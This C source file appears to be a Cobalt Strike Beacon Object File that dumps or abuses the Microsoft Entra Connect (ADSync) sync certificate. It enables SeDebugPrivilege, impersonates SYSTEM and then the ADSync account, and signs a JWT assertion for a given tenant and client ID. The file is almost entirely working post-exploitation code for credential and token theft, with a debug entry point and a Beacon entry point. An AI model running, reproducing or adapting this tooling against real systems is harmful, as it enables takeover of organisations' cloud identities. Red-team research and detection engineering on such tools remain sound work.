#include "entrasyncdump_common.h"


void cmd_dumpcert(CONST CHAR* thumbprint, CONST CHAR* client_id, CONST CHAR* tenant_id) {

    HANDLE hImpToken = NULL;

    // Enable SeDebugPrivilege
    if (!enable_debug_privilege()) {
        return;
    }
    VerbosePrintf(CALLBACK_OUTPUT, "[+] Privilege enabled\n");

    // Full impersonation chain: enum processes → SYSTEM → ADSync
    hImpToken = impersonate_adsync();
    if (!hImpToken) {
        return;
    }

    // Sign JWT under impersonated context
    sign_jwt_assertion(thumbprint, client_id, tenant_id);

    // Cleanup
    API(ADVAPI32, RevertToSelf)();
    API(KERNEL32, CloseHandle)(hImpToken);
}


#ifdef _DEBUG
void main(int argc, char* argv[]) {
    if (argc < 4) {
        printf("Usage: entrasyncdump_dumpcert <thumbprint> <client_id> <tenant_id>\n");
        return;
    }
    cmd_dumpcert(argv[1], argv[2], argv[3]);
}
#else
void go(PCHAR args, int alen) {
    datap parser;
    BeaconDataParse(&parser, args, alen);

    CHAR* thumbprint = BeaconDataExtract(&parser, NULL);
    CHAR* client_id  = BeaconDataExtract(&parser, NULL);
    CHAR* tenant_id  = BeaconDataExtract(&parser, NULL);

    if (!thumbprint || API(MSVCRT, strlen)(thumbprint) == 0 ||
        !client_id  || API(MSVCRT, strlen)(client_id)  == 0 ||
        !tenant_id  || API(MSVCRT, strlen)(tenant_id)  == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "Usage: entrasyncdump_dumpcert <thumbprint> <client_id> <tenant_id>\n"
        );
        return;
    }

    cmd_dumpcert(thumbprint, client_id, tenant_id);
}
#endif
